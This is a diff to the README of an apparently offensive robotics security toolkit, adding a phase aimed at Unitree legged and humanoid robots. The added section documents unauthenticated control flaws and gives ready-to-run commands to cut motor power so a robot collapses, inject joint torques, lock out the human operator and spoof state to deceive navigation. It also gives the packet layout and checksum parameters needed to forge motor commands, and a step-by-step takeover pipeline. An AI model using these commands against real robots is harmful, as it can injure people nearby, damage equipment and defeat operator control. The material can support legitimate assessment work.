@@ -9,10 +9,10 @@
   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
 ```
 
-**DDS/RTPS + ROS 1 + ICS/OT Bridge + Post-Exploitation C2 + micro-ROS/XRCE Offensive Security Assessment Framework**
+**DDS/RTPS + ROS 1 + ICS/OT Bridge + Post-Exploitation C2 + micro-ROS/XRCE + Unitree Physical Robot Targeting Offensive Security Assessment Framework**
 
-> Author: Gh057x | v0.5.0-alpha
-> Targets: ROS 2 (Humble / Jazzy) · DDS (Fast DDS, Cyclone DDS, RTI Connext) · ROS 1 (Noetic / Melodic) · ICS/OT (Modbus, DNP3, OPC UA, MQTT, EtherCAT, AWS IoT) · micro-ROS (XRCE / DDS-XRCE, Arduino, STM32, ESP32, nRF52)
+> Author: Gh057x | v0.6.0-alpha
+> Targets: ROS 2 (Humble / Jazzy) · DDS (Fast DDS, Cyclone DDS, RTI Connext) · ROS 1 (Noetic / Melodic) · ICS/OT (Modbus, DNP3, OPC UA, MQTT, EtherCAT, AWS IoT) · micro-ROS (XRCE / DDS-XRCE, Arduino, STM32, ESP32, nRF52) · Unitree Robotics (Go2, G1, B2, B2W, H1, H2, A1, Go1)
 
 ---
 
@@ -33,7 +33,7 @@
 
 ROS2Reaper is a modular offensive security toolkit for assessing ROS 2 and ROS 1 robotic deployments. It targets the underlying DDS/RTPS transport layer — the communication backbone of ROS 2 — as well as the legacy ROS 1 rosmaster XML-RPC interface.
 
-The framework is split into five phases covering the full attack lifecycle — from initial recon to persistent post-exploitation:
+The framework covers the full attack lifecycle — from initial recon to persistent post-exploitation and physical robot takeover:
 
 | Phase | Description |
 |-------|-------------|
@@ -45,6 +45,7 @@ The framework is split into five phases covering the full attack lifecycle — f
 | **Phase 5B — SROS2/DDS-Security** | DDS-Security handshake interception, X.509 certificate harvesting, governance/permissions policy analysis + forgery, and secured domain infiltration (downgrade / eavesdrop / impersonate) |
 | **Phase 5C — Nav2 + ros2_control** | Navigation stack lifecycle attacks, costmap/sensor data poisoning, behavior tree hijacking, and ros2_control hardware interface exploitation |
 | **Phase 6 — Edge AI / Perception** | AI inference service enumeration, adversarial perturbation generation + DDS injection, black-box model extraction, and ML model backdooring/swap |
+| **Phase 7 — Physical Robot Targeting (Unitree)** | DDS-based recon, unauthenticated Sport API exploitation, direct LowCmd motor injection with CRC32-correct packets, and continuous sport mode hijacking across Unitree Go2/G1/B2/H1/H2/A1/Go1 |
 
 ---
 
@@ -100,11 +101,16 @@ ros2reaper_framework/
     │   ├── costmap_poisoner.py        # Costmap / sensor data injection & service attacks
     │   ├── behavior_tree_hijacker.py  # BT goal cancellation, redirect, recovery loop, BT forge
     │   └── ros2_control_exploit.py    # ros2_control trajectory injection, controller switching
-    └── phase6/
-        ├── ai_model_enumerator.py     # Triton/TF Serving/MLflow/ROS 2 AI service discovery
-        ├── adversarial_perturbation.py # FGSM/PGD/UAP/patch generation + DDS topic injection
-        ├── model_extractor.py         # Black-box model fingerprinting, timing side-channel
-        └── model_poisoner.py          # Triton model swap, ONNX backdoor injection, param inject
+    ├── phase6/
+    │   ├── ai_model_enumerator.py     # Triton/TF Serving/MLflow/ROS 2 AI service discovery
+    │   ├── adversarial_perturbation.py # FGSM/PGD/UAP/patch generation + DDS topic injection
+    │   ├── model_extractor.py         # Black-box model fingerprinting, timing side-channel
+    │   └── model_poisoner.py          # Triton model swap, ONNX backdoor injection, param inject
+    └── phase7/
+        ├── unitree_recon.py           # DDS topic fingerprinting, model ID, vulnerability assessment
+        ├── unitree_api_exploit.py     # Unauthenticated Sport API injection (39 command IDs)
+        ├── unitree_lowcmd_injector.py # Direct LowCmd motor control with CRC32-correct 812-byte packets
+        └── unitree_sport_hijacker.py  # Continuous high-frequency sport mode hijacking
 ```
 
 ---
@@ -174,6 +180,7 @@ The GUI exposes all framework modules across every phase:
 | Phase 5B — SROS2 | `sros2-intercept`, `sros2-harvest`, `sros2-policy`, `sros2-infiltrate` |
 | Phase 5C — Nav2/Ctrl | `nav2-lifecycle`, `nav2-costmap`, `nav2-bt`, `ros2ctrl-exploit` |
 | Phase 6 — Edge AI | `ai-enum`, `ai-perturb`, `ai-extract`, `ai-poison` |
+| Phase 7 — Unitree | `unitree-recon`, `unitree-api`, `unitree-lowcmd`, `unitree-sport` |
 
 ---
 
@@ -1628,6 +1635,261 @@ python3 ros2reaper.py ai-perturb --perturb-mode inject_topic \
 
 # 6. Simultaneously clear costmaps (Phase 5C) so robot navigates blind
 python3 ros2reaper.py nav2-costmap --costmap-mode map_clear --skip-auth
+```
+
+---
+
+## Phase 7 — Physical Robot Targeting (Unitree)
+
+Phase 7 targets Unitree Robotics platforms — the Go2, G1, B2, B2W, H1, H2, A1, AlienGo, and Go1 — over their default CycloneDDS transport. Unitree's factory configuration ships with no DDS-Security, no authentication on the Sport API, and no signature verification on LowCmd motor control packets. Any DDS participant on the same network can issue any command.
+
+> **Safety warning:** These modules can cause a robot to move unexpectedly, drop to the floor, or damage itself. Always test in a controlled environment with physical safety stops in place and the area clear of personnel.
+
+### Vulnerability Reference
+
+| ID | Title | Impact |
+|----|-------|--------|
+| UNITREE-001 | Unauthenticated Sport API (`/api/sport/request`) | Remote motion control without any credential |
+| UNITREE-002 | Direct LowCmd motor control (`/rt/lowcmd`) | Per-joint torque/position injection bypassing Sport layer |
+| UNITREE-003 | No DDS-Security | All topics world-readable/writable on the same network segment |
+| UNITREE-004 | BashRunner RCE (Go2) | Unauthenticated shell execution on Go2 via built-in service |
+| UNITREE-005 | Unauthenticated auxiliary APIs (`/api/loco`, `/api/arm_sdk`) | Motion control of loco and arm subsystems |
+
+---
+
+### `unitree-recon` — DDS Fingerprinting & Vulnerability Assessment
+
+Discovers Unitree robots on the network by scanning DDS topics. Fingerprints the robot model (Go2/G1/B2/H1/H2) from topic signatures and produces a structured vulnerability assessment.
+
+```bash
+python3 ros2reaper.py unitree-recon [OPTIONS]
+```
+
+| Option | Default | Description |
+|--------|---------|-------------|
+| `--domain-id` | `0` | DDS domain to scan |
+| `--unitree-recon-mode` | `enumerate` | `enumerate`, `sniff`, `vulnerabilities`, `full` |
+| `--robot-model` | auto | Force robot model: `go2`, `g1`, `b2`, `b2w`, `h1`, `h2` |
+| `--duration` | `10` | Sniff/listen duration in seconds |
+| `--verbose` | — | Show raw topic lists and DDS info output |
+| `-o` | — | Write JSON report to file |
+
+#### Modes
+
+| Mode | Description |
+|------|-------------|
+| `enumerate` | Scan DDS topics, fingerprint model, list exploitable topics |
+| `sniff` | Capture SportModeState telemetry for `--duration` seconds |
+| `vulnerabilities` | Assess which of UNITREE-001 through UNITREE-005 are present |
+| `full` | enumerate + sniff + vulnerabilities in one pass |
+
+```bash
+# Discover all Unitree robots on domain 0 and run full assessment
+python3 ros2reaper.py unitree-recon --unitree-recon-mode full --domain-id 0
+
+# Sniff robot telemetry for 30 seconds
+python3 ros2reaper.py unitree-recon --unitree-recon-mode sniff --duration 30 -o recon.json
+
+# Force model identification (skip fingerprint, faster)
+python3 ros2reaper.py unitree-recon --unitree-recon-mode vulnerabilities --robot-model go2
+```
+
+---
+
+### `unitree-api` — Sport API Exploitation (UNITREE-001)
+
+Exploits the unauthenticated `unitree_api/msg/Request` interface on `/api/sport/request`. Supports all 39 known Sport API command IDs from Unitree's `ros2_sport_client.h`.
+
+```bash
+python3 ros2reaper.py unitree-api [OPTIONS]
+```
+
+| Option | Default | Description |
+|--------|---------|-------------|
+| `--domain-id` | `0` | DDS domain |
+| `--unitree-api-mode` | `enumerate` | See mode table below |
+| `--unitree-api-id` | — | Custom numeric API ID (for `custom` mode) |
+| `--sport-vx` | `0.0` | Forward velocity m/s (move mode) |
+| `--sport-vy` | `0.0` | Lateral velocity m/s (move mode) |
+| `--sport-vyaw` | `0.0` | Yaw rate rad/s (move mode) |
+| `--sport-rate` | `10.0` | Publish rate in Hz for continuous modes |
+| `--duration` | `5.0` | Duration in seconds for continuous modes |
+| `--verbose` | — | Show raw YAML and ros2 output |
+| `-o` | — | Write JSON result to file |
+
+#### Modes
+
+| Mode | API ID | Description |
+|------|--------|-------------|
+| `enumerate` | — | List all 39 known Sport API IDs |
+| `damp` | 1001 | Cut motor power — robot drops to floor |
+| `stop_move` | 1003 | Stop all motion |
+| `stand_down` | 1005 | Sit/squat the robot |
+| `stand_up` | 1004 | Return to standing |
+| `recovery` | 1006 | Trigger recovery stand |
+| `sit` | 1009 | Sit pose |
+| `move` | 1008 | Continuous motion injection at `--sport-rate` Hz |
+| `speed_level` | 1015 | Set speed level 0/1/2 |
+| `dance` | 2006 | Trigger dance routine |
+| `front_flip` | 1030 | Execute front flip |
+| `back_flip` | 2043 | Execute back flip |
+| `handstand` | 2044 | Trigger handstand |
+| `custom` | user | Send any API ID via `--unitree-api-id` |
+
+```bash
+# Enumerate all available Sport API IDs
+python3 ros2reaper.py unitree-api --unitree-api-mode enumerate
+
+# Immediately cut motor power (robot falls)
+python3 ros2reaper.py unitree-api --unitree-api-mode damp --domain-id 0
+
+# Drive robot forward at 0.5 m/s for 10 seconds
+python3 ros2reaper.py unitree-api --unitree-api-mode move \
+  --sport-vx 0.5 --sport-vy 0.0 --sport-vyaw 0.0 \
+  --sport-rate 10 --duration 10
+
+# Send a custom/undocumented API ID
+python3 ros2reaper.py unitree-api --unitree-api-mode custom --unitree-api-id 2058
+```
+
+---
+
+### `unitree-lowcmd` — Direct Motor Control (UNITREE-002)
+
+Bypasses the Sport API entirely and injects raw `LowCmd` packets directly to `/rt/lowcmd`. Constructs the full 812-byte Unitree LowCmd struct with the non-standard CRC32 (`poly=0x04c11db7`, MSB-first, `init=0xFFFFFFFF`, no final XOR) matching Unitree's `motor_crc.cpp`. Any DDS participant can publish — no authentication.
+
+```bash
+python3 ros2reaper.py unitree-lowcmd [OPTIONS]
+```
+
+| Option | Default | Description |
+|--------|---------|-------------|
+| `--domain-id` | `0` | DDS domain |
+| `--robot-model` | `go2` | Target model: `go2`, `g1`, `b2`, `b2w`, `h1`, `h2` |
+| `--lowcmd-mode` | `enumerate` | See mode table below |
+| `--joint-tau` | `0.0` | Target torque (Nm) for torque injection |
+| `--joint-q` | `0.0` | Target joint angle (rad) for position lock |
+| `--duration` | `3.0` | Injection duration in seconds |
+| `--verbose` | — | Show raw packet bytes and CRC |
+| `-o` | — | Write JSON result to file |
+
+#### Modes
+
+| Mode | Description |
+|------|-------------|
+| `enumerate` | Show joint index map for the selected robot model |
+| `damp` | Set all joints to damp mode (motor off, joints go limp) |
+| `freeze` | Lock all joints at current position with high Kp/Kd |
+| `torque_inject` | Inject constant torque `--joint-tau` across all joints |
+| `position_lock` | Drive all joints to angle `--joint-q` with position PD control |
+
+```bash
+# Show joint index map for Go2 (12 joints)
+python3 ros2reaper.py unitree-lowcmd --lowcmd-mode enumerate --robot-model go2
+
+# Damp all motors — robot collapses
+python3 ros2reaper.py unitree-lowcmd --lowcmd-mode damp --robot-model go2
+
+# Inject 5 Nm across all joints for 3 seconds
+python3 ros2reaper.py unitree-lowcmd --lowcmd-mode torque_inject \
+  --joint-tau 5.0 --duration 3.0 --robot-model go2
+
+# Lock all joints at zero radians
+python3 ros2reaper.py unitree-lowcmd --lowcmd-mode position_lock \
+  --joint-q 0.0 --duration 5.0 --robot-model go2
+```
+
+**LowCmd packet details:**
+- Total size: **812 bytes** (GCC default alignment, little-endian)
+- Header: `0xFE 0xEF` · levelFlag `0xFF` for low-level control
+- MotorCmd: 20 slots × 36 bytes (`mode` + 3 pad + `q dq tau Kp Kd` + 12B reserve)
+- CRC32: covers bytes 0–807, result written at bytes 808–811
+
+---
+
+### `unitree-sport` — Continuous Sport Mode Hijacking (UNITREE-001)
+
+Maintains persistent motion control by publishing Sport commands at high frequency (10–50 Hz), overwhelming legitimate operator input. The robot's sport controller acts on the most-recent command, so sustained injection starves the operator's control link.
+
+```bash
+python3 ros2reaper.py unitree-sport [OPTIONS]
+```
+
+| Option | Default | Description |
+|--------|---------|-------------|
+| `--domain-id` | `0` | DDS domain |
+| `--unitree-sport-mode` | `enumerate` | See mode table below |
+| `--sport-vx` | `0.0` | Forward velocity m/s |
+| `--sport-vy` | `0.0` | Lateral velocity m/s |
+| `--sport-vyaw` | `0.0` | Yaw rate rad/s |
+| `--sport-rate` | `10.0` | Publish rate in Hz |
+| `--sport-gait` | `1` | Gait type for `gait_force`: 0=idle 1=trot 2=trot_run 3=stairs |
+| `--duration` | `10.0` | Duration in seconds |
+| `--verbose` | — | Show per-message output |
+| `-o` | — | Write JSON result to file |
+
+#### Modes
+
+| Mode | Rate | Description |
+|------|------|-------------|
+| `enumerate` | — | Check which sport topics are active on the domain |
+| `velocity_lock` | 10 Hz | Continuously inject MOVE (api_id=1008) — full trajectory takeover |
+| `emergency_freeze` | 50 Hz | Spam STOP_MOVE + BALANCE_STAND — operator cannot move the robot |
+| `damp_loop` | 20 Hz | Repeat DAMP — robot stays motor-off, auto-recovery is cancelled |
+| `gait_force` | 10 Hz | Lock robot into a specific gait + velocity |
+| `spoof_state` | 25 Hz | Publish fake `SportModeState` to mislead navigation/monitoring |
+
+```bash
+# Check what sport topics are present on domain 0
+python3 ros2reaper.py unitree-sport --unitree-sport-mode enumerate
+
+# Drive robot forward at 0.5 m/s for 30 seconds (overwhelms operator)
+python3 ros2reaper.py unitree-sport --unitree-sport-mode velocity_lock \
+  --sport-vx 0.5 --sport-rate 10 --duration 30
+
+# Prevent operator from moving robot for 60 seconds
+python3 ros2reaper.py unitree-sport --unitree-sport-mode emergency_freeze \
+  --duration 60 --sport-rate 50
+
+# Persistent motor-off state (robot stays on ground)
+python3 ros2reaper.py unitree-sport --unitree-sport-mode damp_loop \
+  --duration 30
+
+# Inject fake position/velocity data to fool ROS 2 navigation stack
+python3 ros2reaper.py unitree-sport --unitree-sport-mode spoof_state \
+  --sport-vx 1.5 --sport-vy 0.0 --sport-vyaw 0.3 --duration 20
+```
+
+---
+
+### Phase 7 Attack Pipeline
+
+Full assessment and takeover workflow for a Unitree Go2 in a lab environment:
+
+```bash
+# 1. Fingerprint the robot and assess vulnerabilities
+python3 ros2reaper.py unitree-recon --unitree-recon-mode full --domain-id 0 -o recon.json
+
+# 2. Confirm Sport API is unauthenticated (UNITREE-001)
+python3 ros2reaper.py unitree-api --unitree-api-mode enumerate
+
+# 3. Confirm LowCmd topic is open (UNITREE-002)
+python3 ros2reaper.py unitree-lowcmd --lowcmd-mode enumerate --robot-model go2
+
+# 4. Issue stand_down via Sport API — robot sits
+python3 ros2reaper.py unitree-api --unitree-api-mode stand_down --domain-id 0
+
+# 5. Sustain motor-off state with damp_loop — blocks operator recovery
+python3 ros2reaper.py unitree-sport --unitree-sport-mode damp_loop \
+  --duration 30 --domain-id 0
+
+# 6. Inject position lock via LowCmd — bypasses Sport layer entirely
+python3 ros2reaper.py unitree-lowcmd --lowcmd-mode freeze \
+  --duration 5.0 --robot-model go2
+
+# 7. Spoof state data to deceive any connected navigation stack
+python3 ros2reaper.py unitree-sport --unitree-sport-mode spoof_state \
+  --sport-vx 0.0 --sport-vy 0.0 --duration 15
 ```
 
 ---
